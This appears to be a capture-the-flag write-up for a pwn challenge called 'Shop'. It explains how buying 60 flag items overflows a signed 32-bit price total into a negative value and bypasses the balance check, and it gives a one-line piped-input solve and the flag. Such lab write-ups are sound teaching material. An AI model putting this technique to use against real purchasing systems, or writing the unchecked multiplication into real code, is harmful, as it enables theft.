---
title: Shop
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** Shop
- **Category:** Pwn
- **Flag:** `LYKNCTF{wr4p_wr4p_wr4p}`

---

## My initial read / first impressions

This challenge was a tiny shop program. It gives a menu, lets us buy items, and one of the items is the flag.

The important part was that the flag item was extremely expensive:

```text
36363636
```

So obviously the intended path is not "earn enough money normally." This looked like one of those integer bug challenges where the shop math is the actual target.

The solve ended up being very simple: buy enough flags that the total price overflows.

## The bug

The program calculates the total cost like this conceptually:

```c
int total = price * quantity;

if (total > balance) {
    puts("not enough money");
    return;
}
```

The problem is that `total` is a signed 32-bit integer. The program lets us choose a quantity, multiplies it by the item price, and does not properly check whether that multiplication overflowed.

The flag costs:

```text
36363636
```

If we buy `60` of them, the real mathematical total is:

```text
36363636 * 60 = 2181818160
```

But signed 32-bit integers only go up to:

```text
2147483647
```

So the value overflows. In the binary, it wraps around into a negative number:

```text
2181818160 -> -2113149136
```

Now the check becomes basically useless. A negative total is definitely not greater than our balance, so the shop thinks we can afford it.

## Exploitation

No fancy ROP, shellcode, or libc leak needed. We just buy 60 flags.

The interaction is:

```text
b
3
60
q
```

Where:

```text
b   -> buy
3   -> select the flag item
60  -> quantity
q   -> quit / finish
```

That is enough to trigger the overflow and make the program print the flag.

You can also automate it with:

```bash
printf 'b\n3\n60\nq\n' | ./shop
```

## Why this works

The whole challenge comes down to trusting the result of an overflowing multiplication.

The intended total should be way too expensive:

```text
36363636 * 60 = 2181818160
```

But after signed 32-bit wrapping, the program sees:

```text
-2113149136
```

So the control flow is:

```text
buy flag item
    -> quantity = 60
    -> total cost overflows signed int
    -> total becomes negative
    -> total > balance check fails
    -> purchase is accepted
    -> flag is printed
```

So this was basically an integer overflow / signed wraparound shop bug. The program tried to protect the expensive flag with a price check, but the price check used the broken overflowed value.

## Flag

```text
LYKNCTF{wr4p_wr4p_wr4p}
```
